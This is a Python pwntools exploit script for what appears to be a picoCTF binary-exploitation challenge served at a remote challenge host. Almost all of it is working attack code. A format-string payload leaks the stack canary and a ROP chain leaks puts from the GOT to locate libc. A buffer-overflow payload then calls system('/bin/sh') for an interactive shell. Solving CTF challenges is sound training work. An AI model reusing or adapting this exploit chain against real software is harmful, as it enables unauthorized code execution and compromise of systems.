#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe

ANSWER = 0

### LIBC OFFSETS ###
# ----local offsets----
# PUTS_OFFSET = 0x621d0
# SYSTEM_OFFSET = 0x39b80
# BINSH_OFFSET = 0x140772
# ----remote offsets----
PUTS_OFFSET = 0x67560
SYSTEM_OFFSET = 0x3cf10
BINSH_OFFSET = 0x17b9db
####################

GDB_ARGS = """b *win+144
c
c
c
"""


def conn():
    global ANSWER
    if args.LOCAL:
        ANSWER = -3327
        r = gdb.debug([exe.path], GDB_ARGS)
        # r = process([exe.path])
    else:
        ANSWER = -3727
        r = remote("jupiter.challenges.picoctf.org", 44628)

    return r


def generate_offset():
    pattern = b"A"*500
    for c in range(ord("a"), ord("d")):
        pattern += chr(c).encode()*4

    return pattern


def main():
    r = conn()

    # good luck pwning :)

    win_addr = exe.symbols.win
    puts_plt = exe.plt.puts
    puts_got = exe.got.puts

    # printf_plt = exe.plt.printf

    success(f"{hex(win_addr)=}")
    success(f"{hex(puts_plt)=}")
    success(f"{hex(puts_got)=}")

    ### First run ###
    print(r.recvuntil(b"What number would you like to guess?\n").decode(), end="")
    info("sending " + str(ANSWER))
    r.sendline(str(ANSWER).encode()) # Send correct guess

    ### LEAK CANARY ###
    info("-------------Leaking canary-------------")
    print(r.recvuntil("Name? ").decode())
    r.sendline(r"%135$p ".encode() + b"A"*505)
    # print(1, r.recvuntil("\n"))
    # print(2, r.recvuntil("\n"))
    line = r.recvline()
    print(line.decode())
    canary = int(line.decode().split(" ")[1], 16)
    success(f"{hex(canary)=}")

    ### Second run ###
    print(r.recvuntil("What number would you like to guess?\n").decode(), end="")
    r.sendline(str(ANSWER).encode())

    ### Leaking the system address ###
    info("-------------Leaking system address-------------")
    print(r.recvuntil("Name? ").decode())
    leak_rop_chain = p32(puts_plt) + p32(win_addr) + p32(puts_got)
    payload = b"A"*512 + p32(canary) + b"A"*12 + leak_rop_chain
    info("sending payload " + str(payload))
    r.sendline(payload)
    print(r.recvuntil("AAA\n\n").decode(), end="")
    puts_addr = u32(r.recvline()[:4])

    success(f"{hex(puts_addr)=}")
    libc_addr = puts_addr - PUTS_OFFSET
    system_addr = libc_addr + SYSTEM_OFFSET
    success(f"{hex(system_addr)=}")

    # ### Third run ###
    info("-------------Final exploit-------------")
    binsh_addr = libc_addr + BINSH_OFFSET
    payload = b"A"*512 + p32(canary) + b"A"*12 + p32(system_addr) + p32(win_addr) + p32(binsh_addr)
    info("Sending final exploit")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
